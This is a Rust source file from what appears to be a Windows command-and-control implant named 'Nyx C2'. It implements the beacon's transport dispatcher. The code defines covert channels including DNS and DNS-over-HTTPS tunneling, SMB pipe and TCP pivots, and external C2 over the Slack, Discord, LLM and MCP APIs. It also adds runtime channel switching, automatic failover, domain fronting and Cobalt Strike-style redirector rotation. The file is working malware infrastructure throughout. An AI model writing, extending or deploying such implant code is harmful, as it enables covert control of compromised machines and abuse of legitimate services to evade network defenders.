//! Channel dispatcher — the multi-transport base layer.
//!
//! This is the channel-agnostic dispatch layer that `beacon_loop` calls
//! instead of hardcoding WinHTTP. Each channel variant is a separate module
//! (https/doh/dns/smb/tcp/extc2) implementing the same `send_recv` signature.
//!
//! Design (see docs/superpowers/specs/2026-07-14-transport-dispatcher-design.md):
//!
//! - `Channel` enum + `match` dispatch (no `dyn` — PIC-friendly under no_std).
//! - `CURRENT_CHANNEL: AtomicU8` — runtime hot-switch via `SetChannel` command.
//! - `ChannelCtx` — per-beacon context carrying all channel-specific params.
//! - `FALLBACK_CHAIN` — build-time fallback order for automatic failover.
//!
//! Channel numbering (new scheme — NOT the old transport.rs numbering):
//! ```text
//!   0 Https      1 DohDns     2 Dns       3 SmbPipe
//!   4 Tcp        5 SlackApi   6 LlmApi    7 Mcp
//!   8 DiscordApi
//! ```

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};

// Submodules — each channel implementation.
pub mod https;
pub mod doh;
pub mod dns;
pub mod smb;
pub mod tcp;
pub mod extc2;

// ══════════════════════════════════════════════════════════════════════════════
// Channel enum + runtime state
// ══════════════════════════════════════════════════════════════════════════════

/// Nyx C2 channel type — selects transport protocol.
///
/// Numbering is the wire value used by `Command::SetChannel { channel: u8 }`.
/// The server sends this u8; the implant maps it here. See `from_wire_u8()`
/// for old→new numbering compatibility.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum Channel {
    /// Direct HTTPS POST to C2 server (default, fully implemented).
    Https = 0,
    /// DNS-over-HTTPS tunneling (spec-2).
    DohDns = 1,
    /// Native DNS beacon: A/AAAA/TXT records over UDP 53 (spec-4).
    Dns = 2,
    /// SMB Named Pipe — internal lateral / P2P pivot (spec-2).
    SmbPipe = 3,
    /// Raw TCP beacon — P2P pivot (spec-3).
    Tcp = 4,
    /// External C2 via Slack API (spec-6).
    SlackApi = 5,
    /// External C2 via LLM API e.g. Anthropic (spec-6).
    LlmApi = 6,
    /// External C2 via MCP JSON-RPC (spec-6).
    Mcp = 7,
    /// External C2 via Discord Webhook/Bot API (spec-6).
    DiscordApi = 8,
}

impl Channel {
    /// Convert a raw wire u8 to a Channel. Unknown values default to Https.
    /// This handles the NEW numbering scheme.
    pub fn from_u8(v: u8) -> Self {
        match v {
            0 => Channel::Https,
            1 => Channel::DohDns,
            2 => Channel::Dns,
            3 => Channel::SmbPipe,
            4 => Channel::Tcp,
            5 => Channel::SlackApi,
            6 => Channel::LlmApi,
            7 => Channel::Mcp,
            8 => Channel::DiscordApi,
            _ => Channel::Https,
        }
    }

    /// Map OLD wire numbering (from the pre-spec-1 transport.rs Channel enum)
    /// to the new scheme. This is the compatibility shim so an old server's
    /// `SetChannel` command still works on a new implant.
    ///
    /// Old numbering: Https=0, DohDns=1, SlackApi=2, LlmApi=3, Mcp=4,
    /// WebTrans=5, SmbPipe=6.
    ///
    /// New numbering: Https=0, DohDns=1, Dns=2, SmbPipe=3, Tcp=4, SlackApi=5,
    /// LlmApi=6, Mcp=7, DiscordApi=8.
    ///
    /// The ambiguous cases are 2-4 (old: Slack/LLM/MCP; new: DNS/SMB/TCP).
    /// Resolution: values 2-6 from an old server are mapped to the external-C2
    /// channels they referred to. The new Dns/SmbPipe/Tcp channels use new
    /// numbers (2/3/4) which conflict — but since old servers never send those
    /// new channels, any old-server value ≤6 is treated as legacy.
    pub fn from_wire_u8(v: u8) -> Self {
        match v {
            0 => Channel::Https,
            1 => Channel::DohDns,
            // Legacy mapping: old SlackApi=2 → new SlackApi=5
            2 => Channel::SlackApi,
            // Legacy: old LlmApi=3 → new LlmApi=6
            3 => Channel::LlmApi,
            // Legacy: old Mcp=4 → new Mcp=7
            4 => Channel::Mcp,
            // Legacy: old WebTrans=5 → no equivalent, default to Https
            5 => Channel::Https,
            // Legacy: old SmbPipe=6 → new SmbPipe=3
            6 => Channel::SmbPipe,
            // New numbering for new servers:
            7 => Channel::Mcp,
            8 => Channel::DiscordApi,
            // 2,3,4 from a NEW server are Dns/SmbPipe/Tcp — but we can't
            // distinguish from legacy. New servers should use the dedicated
            // SetChannel variants directly. Default unknown → Https.
            _ => Channel::Https,
        }
    }

    pub fn name(self) -> &'static str {
        match self {
            Channel::Https => "https",
            Channel::DohDns => "doh-dns",
            Channel::Dns => "dns",
            Channel::SmbPipe => "smb-pipe",
            Channel::Tcp => "tcp",
            Channel::SlackApi => "slack-api",
            Channel::LlmApi => "llm-api",
            Channel::Mcp => "mcp",
            Channel::DiscordApi => "discord-api",
        }
    }
}

/// Current active channel. Read by the beacon loop each cycle; written by
/// `set_active()` (via the `SetChannel` command) or `next_fallback()` (auto).
static CURRENT_CHANNEL: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

/// Set the active channel (runtime hot-switch).
pub fn set_active(ch: Channel) {
    CURRENT_CHANNEL.store(ch as u8, core::sync::atomic::Ordering::Release);
}

/// Get the current active channel.
pub fn get_active() -> Channel {
    Channel::from_u8(CURRENT_CHANNEL.load(core::sync::atomic::Ordering::Acquire))
}

// ══════════════════════════════════════════════════════════════════════════════
// Channel context
// ══════════════════════════════════════════════════════════════════════════════

/// Per-beacon context carrying all channel-specific parameters.
///
/// Constructed once from `Config` at beacon_loop start. Passed to
/// `dispatch_send_recv()` each cycle. Each channel reads only its own fields.
pub struct ChannelCtx {
    // ---- HTTPS / DoH / External C2 (all HTTP-based) ----
    pub server_host: String,
    pub server_port: u16,
    pub use_tls: bool,

    // ---- DoH (spec-2) ----
    /// DoH resolver host, e.g. "cloudflare-dns.com". Empty = use default.
    pub doh_resolver: String,

    // ---- SMB Named Pipe (spec-2) ----
    /// Pipe path, e.g. `\\.\pipe\nyx_abc123`. Empty = not configured.
    pub smb_pipe_name: String,

    // ---- TCP Beacon (spec-3) ----
    /// Peer to connect to (for reverse TCP) or listen for (bind TCP).
    /// Set at runtime by `Connect` command, not build-time.
    pub tcp_peer_host: String,
    pub tcp_peer_port: u16,

    // ---- External C2 (spec-6) ----
    /// API host for the external C2 service, e.g. "slack.com" or "discord.com".
    pub extc2_api_host: String,
    /// Bot/webhook token (base64 or raw). Empty = not configured.
    pub extc2_token: String,

    // ---- HTTP channel enhancements (spec-7) ----
    /// Comma-separated redirector hosts for host rotation. Empty = no rotation.
    pub rotation_hosts: String,
    /// Domain-fronting Host header value. Empty = no fronting.
    pub fronting_host: String,
    /// Explicit HTTP proxy `"host:port"`. Empty = system default.
    pub proxy_server: String,
}

impl ChannelCtx {
    /// Build a ChannelCtx from the decoded Config + channel parameters.
    /// Called once at beacon_loop entry.
    pub fn from_config(cfg: &crate::config::Config) -> Self {
        ChannelCtx {
            server_host: cfg.server_host.clone(),
            server_port: cfg.server_port,
            use_tls: cfg.use_tls,
            doh_resolver: cfg.doh_resolver.clone(),
            smb_pipe_name: cfg.smb_pipe_name.clone(),
            tcp_peer_host: String::new(),
            tcp_peer_port: 0,
            extc2_api_host: cfg.extc2_api_host.clone(),
            extc2_token: cfg.extc2_token.clone(),
            rotation_hosts: cfg.rotation_hosts.clone(),
            fronting_host: cfg.fronting_host.clone(),
            proxy_server: cfg.proxy_server.clone(),
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Dispatcher
// ══════════════════════════════════════════════════════════════════════════════

/// Send an encrypted frame via the active channel, return the server's
/// response frame (or `None` = channel failed).
///
/// This is THE unified transport call. `beacon_loop` calls this instead of
/// `transport::channel_post_frame`. Each channel variant dispatches to its
/// module's `send_recv()`.
///
/// Channels not yet implemented (spec-2~6) return `None` and leave a
/// diagnostic marker via `entry::diag_mark()`.
pub unsafe fn dispatch_send_recv(
    ctx: &ChannelCtx,
    active: Channel,
    frame: &[u8],
) -> Option<Vec<u8>> {
    match active {
        Channel::Https => unsafe { https::send_recv(ctx, frame) },
        Channel::DohDns => unsafe { doh::send_recv(ctx, frame) },
        Channel::Dns => unsafe { dns::send_recv(ctx, frame) },
        Channel::SmbPipe => unsafe { smb::send_recv(ctx, frame) },
        Channel::Tcp => unsafe { tcp::send_recv(ctx, frame) },
        Channel::SlackApi => unsafe { extc2::slack_send_recv(ctx, frame) },
        Channel::LlmApi => unsafe { extc2::llm_send_recv(ctx, frame) },
        Channel::Mcp => unsafe { extc2::mcp_send_recv(ctx, frame) },
        Channel::DiscordApi => unsafe { extc2::discord_send_recv(ctx, frame) },
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Fallback chain
// ══════════════════════════════════════════════════════════════════════════════

/// Build-time fallback chain.
///
/// The three HTTP-based channels form a natural degradation ladder: if the
/// primary HTTPS endpoint is down, fall back to DoH (same TCP/TLS plumbing,
/// different URI), then to plain DNS-over-HTTP. Beyond Dns, the remaining
/// channels (SMB/Tcp/ExtC2) require operator-configured infrastructure
/// (pipe names, pivot hosts, API tokens) and cannot be auto-selected — so
/// exhausting the chain returns `None` and the beacon long-sleeps then
/// retries its primary, matching CS 4.10 fail-hold behaviour.
const DEFAULT_FALLBACK_CHAIN: &[Channel] = &[Channel::Https, Channel::DohDns, Channel::Dns];

/// The primary channel — the first element of the fallback chain. When the
/// chain is exhausted the beacon resets to this so the next cycle retries
/// the primary rather than spinning on the last failed channel.
pub const PRIMARY_CHANNEL: Channel = Channel::Https;

/// Returns the next channel to try after `current` fails.
/// Walks the fallback chain; if exhausted, returns `None` (caller should
/// long-sleep then reset to [`PRIMARY_CHANNEL`] and retry).
pub fn next_fallback(current: Channel) -> Option<Channel> {
    let chain: &[Channel] = DEFAULT_FALLBACK_CHAIN;
    let idx = chain.iter().position(|&c| c == current)?;
    chain.get(idx + 1).copied()
}

// ══════════════════════════════════════════════════════════════════════════════
// Host rotation (spec-7) — CS 4.10-style redirector rotation with fail-hold
// ══════════════════════════════════════════════════════════════════════════════

/// Current index into the rotation host list. Advanced on each beacon cycle
/// (round-robin) or on failure (skip to next). CS 4.10 "hold" semantics:
/// a failed host is skipped, not permanently removed — it's retried after
/// the full list is cycled.
static ROTATION_IDX: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Parse the comma-separated `rotation_hosts` config string into a fixed-size
/// array of byte slices. Returns the number of valid hosts found (0 = none).
/// No allocation — slices point directly into the input string's memory
/// (which is `'static` because it lives in the leaked config plaintext).
pub fn parse_rotation_hosts(csv: &str) -> usize {
    // This is used at the https channel level; here we just expose a helper
    // that the https module calls to select the current host.
    csv.split(|c| c == ',' || c == ' ')
        .filter(|s| !s.is_empty())
        .count()
}

/// Select which host to connect to this cycle. If `rotation_hosts` is empty,
/// returns `None` (caller uses `server_host` directly). Otherwise returns a
/// slice into the rotation list at the current round-robin index, and advances
/// the index for next cycle.
///
/// On failure, the caller should call `advance_rotation_host()` to skip the
/// current host (CS 4.10 hold semantics: failed hosts are skipped, retried
/// after a full cycle).
pub fn select_rotation_host<'a>(rotation_hosts: &'a str) -> Option<&'a [u8]> {
    if rotation_hosts.is_empty() {
        return None;
    }
    let hosts: Vec<&str> = rotation_hosts
        .split(|c| c == ',' || c == ' ')
        .filter(|s| !s.is_empty())
        .collect();
    if hosts.is_empty() {
        return None;
    }
    let idx = ROTATION_IDX.load(core::sync::atomic::Ordering::Relaxed) % hosts.len();
    // Advance for next cycle (round-robin).
    ROTATION_IDX.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
    Some(hosts[idx].as_bytes())
}

/// Skip the current rotation host (called after a connection failure).
/// Advances the index so the next `select_rotation_host` call picks a
/// different host.
pub fn advance_rotation_host() {
    ROTATION_IDX.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
}
